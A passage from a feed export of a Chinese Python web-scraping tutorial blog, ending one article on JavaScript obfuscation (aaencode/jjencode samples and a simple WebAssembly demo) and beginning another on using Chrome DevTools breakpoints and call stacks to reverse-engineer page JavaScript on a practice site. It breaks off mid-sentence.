class="comment">((ﾟｰﾟ==3)</span> +<span class="string">'_'</span>) [ﾟΘﾟ];<span class="comment">(ﾟДﾟ)</span> [<span class="string">'_'</span>] =<span class="comment">(o^_^o)</span> [ﾟoﾟ] [ﾟoﾟ];<span class="comment">(ﾟεﾟ)</span>=<span class="comment">((ﾟｰﾟ==3)</span> +<span class="string">'_'</span>) [ﾟΘﾟ]+ <span class="comment">(ﾟДﾟ)</span> .ﾟДﾟﾉ+<span class="comment">((ﾟДﾟ)</span>+<span class="string">'_'</span>) [<span class="comment">(ﾟｰﾟ)</span> + <span class="comment">(ﾟｰﾟ)</span>]+<span class="comment">((ﾟｰﾟ==3)</span> +<span class="string">'_'</span>) [o^_^o -ﾟΘﾟ]+<span class="comment">((ﾟｰﾟ==3)</span> +<span class="string">'_'</span>) [ﾟΘﾟ]+ <span class="comment">(ﾟωﾟﾉ +'_')</span> [ﾟΘﾟ]; <span class="comment">(ﾟｰﾟ)</span>+=<span class="comment">(ﾟΘﾟ)</span>; <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]=<span class="string">'\\'</span>; <span class="comment">(ﾟДﾟ)</span>.ﾟΘﾟﾉ=<span class="comment">(ﾟДﾟ+ ﾟｰﾟ)</span>[o^_^o -<span class="comment">(ﾟΘﾟ)</span>];<span class="comment">(oﾟｰﾟo)</span>=<span class="comment">(ﾟωﾟﾉ +'_')</span>[c^_^o];<span class="comment">(ﾟДﾟ)</span> [ﾟoﾟ]=<span class="string">'\"'</span>;<span class="comment">(ﾟДﾟ)</span> [<span class="string">'_'</span>] <span class="comment">( (ﾟДﾟ)</span> [<span class="string">'_'</span>] <span class="comment">(ﾟεﾟ+(ﾟДﾟ)</span>[ﾟoﾟ]+ <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">(ﾟΘﾟ)</span>+ <span class="comment">((o^_^o)</span> +<span class="comment">(o^_^o)</span>)+ <span class="comment">((o^_^o)</span> +<span class="comment">(o^_^o)</span>)+ <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">(ﾟΘﾟ)</span>+ <span class="comment">(ﾟｰﾟ)</span>+ <span class="comment">(ﾟΘﾟ)</span>+ <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">(ﾟΘﾟ)</span>+ <span class="comment">((o^_^o)</span> +<span class="comment">(o^_^o)</span>)+ <span class="comment">((o^_^o)</span> - <span class="comment">(ﾟΘﾟ)</span>)+ <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">(ﾟｰﾟ)</span>+ <span class="comment">(c^_^o)</span>+ <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">(ﾟΘﾟ)</span>+ <span class="comment">(ﾟｰﾟ)</span>+ <span class="comment">(ﾟΘﾟ)</span>+ <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">(ﾟｰﾟ)</span>+ <span class="comment">(c^_^o)</span>+ <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">((ﾟｰﾟ)</span> + <span class="comment">(o^_^o)</span>)+ <span class="comment">((ﾟｰﾟ)</span> + <span class="comment">(ﾟΘﾟ)</span>)+ <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">(ﾟｰﾟ)</span>+ <span class="comment">(c^_^o)</span>+ <span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">((o^_^o)</span> +<span class="comment">(o^_^o)</span>)+ <span class="comment">(ﾟΘﾟ)</span>+ <span class="comment">(ﾟДﾟ)</span>[ﾟoﾟ])<span class="comment">(ﾟΘﾟ)</span>)<span class="comment">((ﾟΘﾟ)</span>+<span class="comment">(ﾟДﾟ)</span>[ﾟεﾟ]+<span class="comment">((ﾟｰﾟ)</span>+<span class="comment">(ﾟΘﾟ)</span>)+<span class="comment">(ﾟΘﾟ)</span>+<span class="comment">(ﾟДﾟ)</span>[ﾟoﾟ]);</span><br></pre>      </td>    </tr>  </table></figure><p>jjencode 的结果：</p><figure class="highlight powershell">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="variable">$</span>=~[];<span class="variable">$</span>=&#123;___:++<span class="variable">$</span>,<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>:(![]+<span class="string">""</span>)[<span class="variable">$</span>],__<span class="variable">$</span>:++<span class="variable">$</span>,<span class="variable">$_</span><span class="variable">$_:</span>(![]+<span class="string">""</span>)[<span class="variable">$</span>],_<span class="variable">$_:</span>++<span class="variable">$</span>,<span class="variable">$_</span><span class="variable">$</span><span class="variable">$</span>:(&#123;&#125;+<span class="string">""</span>)[<span class="variable">$</span>],<span class="variable">$</span><span class="variable">$_</span><span class="variable">$</span>:(<span class="variable">$</span>[<span class="variable">$</span>]+<span class="string">""</span>)[<span class="variable">$</span>],_<span class="variable">$</span><span class="variable">$</span>:++<span class="variable">$</span>,<span class="variable">$</span><span class="variable">$</span><span class="variable">$_:</span>(!<span class="string">""</span>+<span class="string">""</span>)[<span class="variable">$</span>],<span class="variable">$__:</span>++<span class="variable">$</span>,<span class="variable">$_</span><span class="variable">$</span>:++<span class="variable">$</span>,<span class="variable">$</span><span class="variable">$__:</span>(&#123;&#125;+<span class="string">""</span>)[<span class="variable">$</span>],<span class="variable">$</span><span class="variable">$_:</span>++<span class="variable">$</span>,<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>:++<span class="variable">$</span>,<span class="variable">$___:</span>++<span class="variable">$</span>,<span class="variable">$__</span><span class="variable">$</span>:++<span class="variable">$</span>&#125;;<span class="variable">$</span>.<span class="variable">$_</span>=(<span class="variable">$</span>.<span class="variable">$_</span>=<span class="variable">$</span>+<span class="string">""</span>)[<span class="variable">$</span><span class="type">.</span><span class="variable">$_</span><span class="variable">$</span>]+(<span class="variable">$</span>._<span class="variable">$</span>=<span class="variable">$</span>.<span class="variable">$_</span>[<span class="variable">$</span><span class="type">.__</span><span class="variable">$</span>])+(<span class="variable">$</span>.<span class="variable">$</span><span class="variable">$</span>=(<span class="variable">$</span>.<span class="variable">$</span>+<span class="string">""</span>)[<span class="variable">$</span><span class="type">.__</span><span class="variable">$</span>])+((!<span class="variable">$</span>)+<span class="string">""</span>)[<span class="variable">$</span><span class="type">._</span><span class="variable">$</span><span class="variable">$</span>]+(<span class="variable">$</span>.__=<span class="variable">$</span>.<span class="variable">$_</span>[<span class="variable">$</span><span class="type">.</span><span class="variable">$</span><span class="variable">$_</span>])+(<span class="variable">$</span>.<span class="variable">$</span>=(!<span class="string">""</span>+<span class="string">""</span>)[<span class="variable">$</span><span class="type">.__</span><span class="variable">$</span>])+(<span class="variable">$</span>._=(!<span class="string">""</span>+<span class="string">""</span>)[<span class="variable">$</span><span class="type">._</span><span class="variable">$_</span>])+<span class="variable">$</span>.<span class="variable">$_</span>[<span class="variable">$</span><span class="type">.</span><span class="variable">$_</span><span class="variable">$</span>]+<span class="variable">$</span>.__+<span class="variable">$</span>._<span class="variable">$</span>+<span class="variable">$</span>.<span class="variable">$</span>;<span class="variable">$</span>.<span class="variable">$</span><span class="variable">$</span>=<span class="variable">$</span>.<span class="variable">$</span>+(!<span class="string">""</span>+<span class="string">""</span>)[<span class="variable">$</span><span class="type">._</span><span class="variable">$</span><span class="variable">$</span>]+<span class="variable">$</span>.__+<span class="variable">$</span>._+<span class="variable">$</span>.<span class="variable">$</span>+<span class="variable">$</span>.<span class="variable">$</span><span class="variable">$</span>;<span class="variable">$</span>.<span class="variable">$</span>=(<span class="variable">$</span>.___)[<span class="variable">$</span><span class="type">.</span><span class="variable">$_</span>][<span class="variable">$</span><span class="type">.</span><span class="variable">$_</span>];<span class="variable">$</span>.<span class="variable">$</span>(<span class="variable">$</span>.<span class="variable">$</span>(<span class="variable">$</span>.<span class="variable">$</span><span class="variable">$</span>+<span class="string">"\"</span><span class="string">"+"</span>\\<span class="string">"+<span class="variable">$</span>.__<span class="variable">$</span>+<span class="variable">$</span>.<span class="variable">$</span><span class="variable">$_</span>+<span class="variable">$</span>.<span class="variable">$</span><span class="variable">$_</span>+<span class="variable">$</span>.<span class="variable">$_</span><span class="variable">$_</span>+"</span>\\<span class="string">"+<span class="variable">$</span>.__<span class="variable">$</span>+<span class="variable">$</span>.<span class="variable">$</span><span class="variable">$_</span>+<span class="variable">$</span>._<span class="variable">$_</span>+"</span>\\<span class="string">"+<span class="variable">$</span>.<span class="variable">$__</span>+<span class="variable">$</span>.___+<span class="variable">$</span>.<span class="variable">$_</span><span class="variable">$_</span>+"</span>\\<span class="string">"+<span class="variable">$</span>.<span class="variable">$__</span>+<span class="variable">$</span>.___+"</span>=\\<span class="string">"+<span class="variable">$</span>.<span class="variable">$__</span>+<span class="variable">$</span>.___+<span class="variable">$</span>.__<span class="variable">$</span>+"</span>\<span class="string">""</span>)())();</span><br></pre>      </td>    </tr>  </table></figure><p>可以看到，通过这些工具，原本非常简单的代码被转化为一些几乎完全不可读的代码，但实际上运行效果还是相同的。这些混淆方式比较另类，看起来虽然没有什么头绪，但实际上找到规律是非常好还原的，其没有真正达到强力混淆的效果。</p><p>以上便是对 JavaScript 混淆方式的介绍和总结。总的来说，经过混淆的 JavaScript 代码其可读性大大降低，同时防护效果也大大增强。</p><h2 id="6-WebAssembly"><a href="#6-WebAssembly" class="headerlink" title="6. WebAssembly"></a>6. WebAssembly</h2><p>随着技术的发展，WebAssembly 逐渐流行起来。不同于 JavaScript 混淆技术， WebAssembly 其基本思路是将一些核心逻辑使用其他语言（如 C/C++ 语言）来编写，并编译成类似字节码的文件，并通过 JavaScript 调用执行，从而起到二进制级别的防护作用。</p><p>WebAssembly 是一种可以使用非 JavaScript 编程语言编写代码并且能在浏览器上运行的技术方案，比如借助于我们能将 C/C++ 利用 Emscripten 编译工具转成 wasm 格式的文件， JavaScript 可以直接调用该文件执行其中的方法。</p><p>WebAssembly 是经过编译器编译之后的字节码，可以从 C/C++ 编译而来，得到的字节码具有和 JavaScript 相同的功能，运行速度更快，体积更小，而且在语法上完全脱离 JavaScript，同时具有沙盒化的执行环境。</p><p>比如这就是一个基本的 WebAssembly 示例：</p><figure class="highlight javascript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre>      </td>      <td class="code">        <pre><span class="line">WebAssembly.compile(</span><br><span class="line">  <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(</span><br><span class="line">    <span class="string">`</span></span><br><span class="line"><span class="string">  00 61 73 6d  01 00 00 00  01 0c 02 60  02 7f 7f 01</span></span><br><span class="line"><span class="string">  7f 60 01 7f  01 7f 03 03  02 00 01 07  10 02 03 61</span></span><br><span class="line"><span class="string">  64 64 00 00  06 73 71 75  61 72 65 00  01 0a 13 02</span></span><br><span class="line"><span class="string">  08 00 20 00  20 01 6a 0f  0b 08 00 20  00 20 00 6c</span></span><br><span class="line"><span class="string">  0f 0b`</span></span><br><span class="line">      .trim()</span><br><span class="line">      .split(<span class="regexp">/[\s\r\n]+/g</span>)</span><br><span class="line">      .map(<span class="function">(<span class="params">str</span>) =&gt;</span> <span class="built_in">parseInt</span>(str, <span class="number">16</span>))</span><br><span class="line">  )</span><br><span class="line">).then(<span class="function">(<span class="params"><span class="built_in">module</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> instance = <span class="keyword">new</span> WebAssembly.Instance(<span class="built_in">module</span>);</span><br><span class="line">  <span class="keyword">const</span> &#123; add, square &#125; = instance.exports;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"2 + 4 ="</span>, add(<span class="number">2</span>, <span class="number">4</span>));</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"3^2 ="</span>, square(<span class="number">3</span>));</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"(2 + 5)^2 ="</span>, square(add(<span class="number">2</span> + <span class="number">5</span>)));</span><br><span class="line">&#125;);</span><br></pre>      </td>    </tr>  </table></figure><p>这里其实是利用 WebAssembly 定义了两个方法，分别是 add 和 square，可以分别用于求和和开平方计算。那这两个方法在哪里声明的呢？其实它们被隐藏在了一个 Uint8Array 里面，仅仅查看明文代码我们确实无从知晓里面究竟定义了什么逻辑，但确实是可以执行的，我们将这段代码输入到浏览器控制台下，运行结果如下：</p><figure class="highlight angelscript">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>      </td>      <td class="code">        <pre><span class="line"><span class="number">2</span> + <span class="number">4</span> = <span class="number">6</span></span><br><span class="line"><span class="number">3</span>^<span class="number">2</span> = <span class="number">9</span></span><br><span class="line">(<span class="number">2</span> + <span class="number">5</span>)^<span class="number">2</span> = <span class="number">49</span></span><br></pre>      </td>    </tr>  </table></figure><p>由此可见，通过 WebAssembly 我们可以成功将核心逻辑“隐藏”起来，这样某些核心逻辑就不能被轻易找出来了。</p><p>所以，很多网站越来越多使用 WebAssembly 技术来保护一些核心逻辑不被轻易被人识别或破解，可以起到更好的防护效果。</p><h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h2><p>以上，我们就介绍了接口加密技术和 JavaScript 的压缩、混淆技术，也对 WebAssembly 技术有了初步的了解，知己知彼方能百战不殆，了解了原理，我们才能更好地去实现 JavaScript 的逆向。</p><p>本节代码：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1B5dGhvbjNXZWJTcGlkZXIvSmF2YVNjcmlwdE9iZnVzY2F0ZQ==">https://github.com/Python3WebSpider/JavaScriptObfuscate<i class="fa fa-external-link-alt"></i></span>。</p><p>由于本节涉及一些专业名词，部分内容参考来源如下：</p><ul>  <li>GitHub - javascript-obfuscator 官方 GitHub 仓库：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2phdmFzY3JpcHQtb2JmdXNjYXRvci9qYXZhc2NyaXB0LW9iZnVzY2F0b3I=">https://github.com/javascript-obfuscator/javascript-obfuscator<i class="fa fa-external-link-alt"></i></span></li>  <li>官网 - javascript-obfuscator 官网：<span class="exturl" data-url="aHR0cHM6Ly9vYmZ1c2NhdG9yLmlvLw==">https://obfuscator.io/<i class="fa fa-external-link-alt"></i></span></li>  <li>博客 - asm.js 和 Emscripten 入门教程：<span class="exturl" data-url="aHR0cHM6Ly93d3cucnVhbnlpZmVuZy5jb20vYmxvZy8yMDE3LzA5L2FzbWpzX2Vtc2NyaXB0ZW4uaHRtbA==">https://www.ruanyifeng.com/blog/2017/09/asmjs_emscripten.html<i class="fa fa-external-link-alt"></i></span></li>  <li>博客 - JavaScript 混淆安全加固：<span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vcG9zdC81Y2ZjYjlkMjUxODgyNTdlODUzZmE3MWM=">https://juejin.im/post/5cfcb9d25188257e853fa71c<i class="fa fa-external-link-alt"></i></span></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
  &lt;p&gt;系列文章总目录：&lt;a href=&quot;https://cuiqingcai.com/17777.html&quot;&gt;【2022 年】Python3 爬虫学习教程&lt;/a&gt;，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 202
      
    
    </summary>
    
    
      <category term="Python" scheme="https://cuiqingcai.com/categories/Python/"/>
    
      <category term="爬虫" scheme="https://cuiqingcai.com/categories/Python/%E7%88%AC%E8%99%AB/"/>
    
    
      <category term="爬虫" scheme="https://cuiqingcai.com/tags/%E7%88%AC%E8%99%AB/"/>
    
      <category term="网络爬虫" scheme="https://cuiqingcai.com/tags/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/"/>
    
      <category term="2022" scheme="https://cuiqingcai.com/tags/2022/"/>
    
      <category term="Python 爬虫" scheme="https://cuiqingcai.com/tags/Python-%E7%88%AC%E8%99%AB/"/>
    
      <category term="JavaScript" scheme="https://cuiqingcai.com/tags/JavaScript/"/>
    
      <category term="混淆" scheme="https://cuiqingcai.com/tags/%E6%B7%B7%E6%B7%86/"/>
    
  </entry>
  
  <entry>
    <title>【2022 年】Python3 爬虫教程 - JavaScript 逆向调试常用技巧</title>
    <link href="https://cuiqingcai.com/2022112.html"/>
    <id>https://cuiqingcai.com/2022112.html</id>
    <published>2022-03-05T06:11:52.000Z</published>
    <updated>2022-08-01T15:41:25.996Z</updated>
    
    <content type="html"><![CDATA[<blockquote>  <p>系列文章总目录：<a href="https://cuiqingcai.com/17777.html">【2022 年】Python3 爬虫学习教程</a>，本教程内容多数来自于《Python3网络爬虫开发实战（第二版）》一书，目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就仅有<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">《Python3 网络爬虫开发实战（第二版）》<i class="fa fa-external-link-alt"></i></span>一书了，<span class="exturl" data-url="aHR0cHM6Ly9pdGVtLmpkLmNvbS8xMzUyNzIyMi5odG1s">点击了解详情<i class="fa fa-external-link-alt"></i></span>。</p></blockquote><p>前面一节我们了解了 JavaScript 的压缩、混淆等技术，现在越来越多的网站也已经应用了这些技术对其数据接口进行了保护，在做爬虫时如果我们遇到了这种情况，我们可能就不得不硬着头皮来去想方设法找出其中隐含的关键逻辑了，这个过程我们可以称之为 JavaScript 逆向。</p><p>既然我们要做 JavaScript 逆向，那少不了要用到浏览器的开发者工具，因为网页是在浏览器中加载的，所以多数的调试过程也是在浏览器中完成的。</p><p>工欲善其事，必先利其器。本节我们先来基于 Chrome 浏览器介绍一下浏览器开发者工具的使用。但由于开发者工具功能十分复杂，本节主要介绍对 JavaScript 逆向有一些帮助的功能，学会了这些，我们在做 JavaScript 逆向调试的过程会更加得心应手。</p><p>本节我们以一个示例网站 <span class="exturl" data-url="aHR0cHM6Ly9zcGEyLnNjcmFwZS5jZW50ZXIv">https://spa2.scrape.center/<i class="fa fa-external-link-alt"></i></span> 来做演示，用这个示例来介绍浏览器开发者工具各个面版的用法。</p><h2 id="1-面板介绍"><a href="#1-面板介绍" class="headerlink" title="1. 面板介绍"></a>1. 面板介绍</h2><p>首先我们用 Chrome 浏览器打开示例网站，页面如图所示：</p><p><img src="https://qiniu.cuiqingcai.com/tc2si.png" alt="示例网站页面"></p><p>接下来打开开发者工具，我们会看到类似图 xx 所示的结果。</p><p><img src="https://qiniu.cuiqingcai.com/q32zi.png" alt="打开开发者工具"></p><p>这里可以看到多个面板标签，如 Elements、Console、Sources 等，这就是开发者工具的一个个面板，功能丰富而又强大，先对面板作下简单的介绍：</p><ul>  <li>Elements：元素面板，用于查看或修改当前网页 HTML 节点的属性、CSS 属性、监听事件等等，HTML 和 CSS 都可以即时修改和即时显示。</li>  <li>Console：控制台面板，用于查看调试日志或异常信息。另外我们还可以在控制台输入 JavaScript 代码，方便调试。</li>  <li>Sources：源代码面板，用于查看页面的 HTML 文件源代码、JavaScript 源代码、CSS 源代码，还可以在此面板对 JavaScript 代码进行调试，比如添加和修改 JavaScript 断点，观察 JavaScript 变量变化等。</li>  <li>Network：网络面板，用于查看页面加载过程中的各个网络请求，包括请求、响应等各个详情。</li>  <li>Performance：性能面板，用于记录和分析页面在运行时的所有活动，比如 CPU 占用情况，呈现页面性能分析结果，</li>  <li>Memory：内存面板，用于记录和分析页面占用内存情况，如查看内存占用变化，查看 JavaScript 对象和 HTML 节点的内存分配。</li>  <li>Application：应用面板，用于记录网站加载的所有资源信息，如存储、缓存、字体、图片等，同时也可以对一些资源进行修改和删除。</li>  <li>Lighthouse：审核面板，用于分析网络应用和网页，收集现代性能指标并提供对开发人员最佳实践的意见。</li></ul><p>了解了这些面板之后，我们来深入了解几个面板中对 JavaScript 调试很有帮助的功能。</p><h2 id="2-查看节点事件"><a href="#2-查看节点事件" class="headerlink" title="2. 查看节点事件"></a>2. 查看节点事件</h2><p>之前我们是用 Elements 面板来审查页面的节点信息的，我们可以查看当前页面的 HTML 源代码及其在网页中对应的位置，查看某个条目的标题对应的页面源代码，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/oigc0.png" alt="查看源代码"></p><p>点击右侧的 Styles 选项卡，可以看到对应节点的 CSS 样式，我们可以自行在这里增删样式，实时预览效果，这对网页开发十分有帮助。</p><p>在 Computed 选项卡中还可以看到当前节点的盒子模型，比如外边距、内边距等，还可以看到当前节点最终计算出的 CSS 的样式，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/9uo6h.png" alt="盒子模型"></p><p>接下来切换到右侧的 Event Listeners 选项卡，这里可以显示各个节点当前已经绑定的事件，都是 JavaScript 原生支持的，下面简单列举几个事件。</p><ul>  <li><code>change</code>：HTML 元素改变时会触发的事件。</li>  <li><code>click</code>：用户点击 HTML 元素时会触发的事件。</li>  <li><code>mouseover</code>：用户在一个 HTML 元素上移动鼠标会触发的事件。</li>  <li><code>mouseout</code>：用户从一个 HTML 元素上移开鼠标会触发的事件。</li>  <li><code>keydown</code>：用户按下键盘按键会触发的事件。</li>  <li><code>load</code>：浏览器完成页面加载时会触发的事件。</li></ul><p>通常，我们会给按钮绑定一个点击事件，它的处理逻辑一般是由 JavaScript 定义的，这样在我们点击按钮的时候，对应的 JavaScript 代码便会执行。比如在图 xx 中，我们选中切换到第 2 页的节点，右侧 Event Listeners 选项卡下会看到它绑定的事件。</p><p><img src="https://qiniu.cuiqingcai.com/068my.png" alt="选中切换到第 2 页的节点"></p><p>这里有对应事件的代码位置，内容为一个 JavaScript 文件名称 <code>chunk-vendors.77daf991.js</code>，然后紧跟一个冒号，然后再跟了一个数字 7。所以对应的事件处理函数是定义在 <code>chunk-vendors.77daf991.js</code> 这个文件的第 7 行。点击这个代码位置，便会自动跳转 Sources 面板，打开对应的 <code>chunk-vendors.77daf991.js</code> 文件并跳转到对应的位置，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/s26fz.png" alt="跳转到对应的代码位置"></p><p>所以，利用好 Event Listeners，我们可以轻松地找到各个节点绑定事件的处理方法所在的位置，帮我们在 JavaScript 逆向过程中找到一些突破口。</p><h2 id="3-代码美化"><a href="#3-代码美化" class="headerlink" title="3. 代码美化"></a>3. 代码美化</h2><p>刚才我们已经通过 Event Listeners 找到了对应的事件处理方法所在的位置并成功跳转到了代码所在的位置。</p><p>但是，这部分代码似乎被压缩过了，可读性很差，根本没法阅读，这时候应该怎么办呢？</p><p>不用担心，Sources 面板提供了一个便捷好用的代码美化功能。我们点击代码面板左下角的格式化按钮，代码就会变成如图所示的样子。</p><p><img src="https://qiniu.cuiqingcai.com/92ouc.png" alt="代码格式化按钮"></p><p><img src="https://qiniu.cuiqingcai.com/da7lc.png" alt="格式化后的代码"></p><p>此时会新出现一个叫作 <code>chunk-vendors.77daf991.js:formatted</code> 的选项卡，文件名后面加了 formatted 标识，代表这是被格式化的结果。我们会发现，原来代码在第 7 行，现在自动对应到了第 4445 行，而且对应的代码位置会高亮显示，代码可读性大大增强！</p><p>这个功能在调试过程中非常常用，用好这个功能会给我们的 JavaScript 调试过程带来极大的便利。</p><h2 id="4-断点调试"><a href="#4-断点调试" class="headerlink" title="4. 断点调试"></a>4. 断点调试</h2><p>接下来介绍一个非常重要的功能——断点调试。在调试代码的时候，我们可以在需要的位置上打断点，当对应事件触发时，浏览器就会自动停在断点的位置等待调试，此时我们可以选择单步调试，在面板中观察调用栈、变量值，以更好地追踪对应位置的执行逻辑。</p><p>那么断点怎么打呢？我们接着以上面的例子来说。首先单击如图所示的代码行号。</p><p><img src="https://qiniu.cuiqingcai.com/ynj3a.png" alt="单击代码行号"></p><p>这时候行号处就出现了一个蓝色的箭头，这就证明断点已经添加好了，同时在右侧的 Breakpoints 选项卡下会出现我们添加的断点的列表。</p><p>由于我们知道这个断点是用来处理翻页按钮的点击事件的，所以可以在网页里面点击按钮试一下，比如点击第 2 页的按钮，这时候就会发现断点被触发了，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/sx6uu.png" alt="断点被触发"></p><p>这时候我们可以看到页面中显示了一个叫作 <code>Paused in debugger</code> 的提示，这说明浏览器执行到刚才我们设置断点的位置处就不再继续执行了，等待我们发号施令执行调试。</p><p>此时代码停在了第 4446 行，回调参数 <code>e</code> 就是对应的点击事件 <code>MouseEvent</code> 。在右侧的 Scope 面板处，可以观察到各个变量的值，比如在 <code>Local</code> 域下有当前方法的局部变量，我们可以在这里看到 <code>MouseEvent</code> 的各个属性，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/wtc7z.png" alt="查看 Local 域"></p><p>另外我们关注到有一个方法 <code>o</code>，它在 <code>Jr</code> 方法下面，所以切换到 <code>Closure(Jr)</code> 域可以查看它的定义及其接收的参数，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/eahmg.png" alt="查看 Closure(Jr) 域"></p><p>我们可以看到，<code>FunctionLocation</code> 又指向了方法 <code>o</code> ，点击之后便又可以跳到指定位置，用同样的方式进行断点调试即可。</p><p>在 Scope 面板还有多个域，这里就不再展开介绍了。总之，通过 Scope 面板，我们可以看到当前执行环境下的变量的值和方法的定义，知道当前代码究竟执行了怎样的逻辑。</p><p>接下来切换到 Watch 面板，在这里可以自行添加想要查看的变量和方法，点击右上角的 + 号按钮，我们可以任意添加想要监听的对象，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/qb3kr.png" alt="Watch 面板"></p><p>比如这里我们比较关注 <code>o.apply</code> 是一个怎样的方法，于是点击添加 <code>o.apply</code>，这里就会把对应的方法定义呈现出来，展开之后可以再点击 <code>FunctionLocation</code> 定位其源码位置。</p><p>我们还可以切换到 Console 面板，输入任意的 JavaScript 代码，便会执行、输出对应的结果，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/nwxwl.png" alt="Console 面板"></p><p>如果我们想看看变量 <code>arguments</code> 的第一个元素是什么，那么可以直接敲入 <code>arguments[0]</code>，便会输出对应的结果 <code>MouseEvent</code>，只要在当前上下文能访问到的变量都可以直接引用并输出。</p><p>此时我们还可以选择单步调试，这里有 3 个重要的按钮，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/564d1.png" alt="单步调试按钮"></p><p>这 3 个按钮都可以做单步调试，但功能不同。</p><ul>  <li>Step Over Next Function Call：逐语句执行</li>  <li>Step Into Next Function Call：进入方法内部执行</li>  <li>Step Out of Current Function：跳出当前方法</li></ul><p>用得较多的是第一个，相当于逐行调试，比如点击 Step Over Next Function Call 这个按钮，就运行到了 4447 行，高亮的位置就变成了这一行，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/8vzzb.png" alt="点击 Step Over Next Function Call 按钮"></p><h2 id="5-观察调用栈"><a href="#5-观察调用栈" class="headerlink" title="5. 观察调用栈"></a>5. 观察调用栈</h2><p>在调试的过程中，我们可能会跳到一个新的位置，比如点击上述 Step Over Next Function Call 几下，可能会跳到一个叫作 <code>ct</code> 的方法中，这时候我们也不知道发生了什么，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/1646k.png" alt="跳到 ct 方法中"></p><p>那究竟是怎么跳过来的呢？我们可以观察一下右侧的 Call Stack 面板，就可以看到全部的调用过程了。比如它的上一步是 <code>ot</code> 方法，再上一步是 <code>pt</code> 方法，点击对应的位置也可以跳转到对应的代码位置，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/y49p1.png" alt="Call Stack 面板"></p><p>有时候调用栈是非常有用的，利用它我们可以回溯某个逻辑的执行流程，从而快速找到突破口。</p><h2 id="6-恢复-JavaScript-执行"><a href="#6-恢复-JavaScript-执行" class="headerlink" title="6. 恢复 JavaScript 执行"></a>6. 恢复 JavaScript 执行</h2><p>在调试过程中，如果想快速跳到下一个断点或者让 JavaScript 代码运行下去，可以点击 Resume script execution 按钮，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/5hdph.png" alt="Resume script execution 按钮"></p><p>这时浏览器会直接执行到下一个断点的位置，从而避免陷入无穷无尽的调试中。</p><p>当然，如果没有其他断点了，浏览器就会恢复正常状态。比如这里我们就没有再设置其他断点了，浏览器直接运行并加载了下一页的数据，同时页面恢复正常，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/k14kv.png" alt="浏览器恢复正常状态"></p><h2 id="7-Ajax-断点"><a href="#7-Ajax-断点" class="headerlink" title="7. Ajax 断点"></a>7. Ajax 断点</h2><p>上面我们介绍了一些 DOM 节点的 Listener，通过 Listener 我们可以手动设置断点并进行调试。但其实针对这个例子，通过翻页的点击事件 Listener 是不太容易找到突破口的。</p><p>接下来我们再介绍一个方法—— Ajax 断点，它可以在发生 Ajax 请求的时候触发断点。对于这个例子，我们的目标其实就是找到 Ajax 请求的那一部分逻辑，找出加密参数是怎么构造的。可以想到，通过 Ajax 断点，使页面在获取数据的时候停下来，我们就可以顺着找到构造 Ajax 请求的逻辑了。</p><p>怎么设置呢？</p><p>我们把之前的断点全部取消，切换到 Sources 面板下，然后展开 XHR/fetch Breakpoints，这里就可以设置 Ajax 断点，如图所示。</p><p><img src="https://qiniu.cuiqingcai.com/0fkn8.png" alt="展开 XHR/fetch Breakpoints"></p><p>要设置断点，就要先观察 Ajax 请求。和之前一样，我们点击翻页按钮 2，在 Network 面板里面观察 Ajax 请求是怎样的，请求的 URL 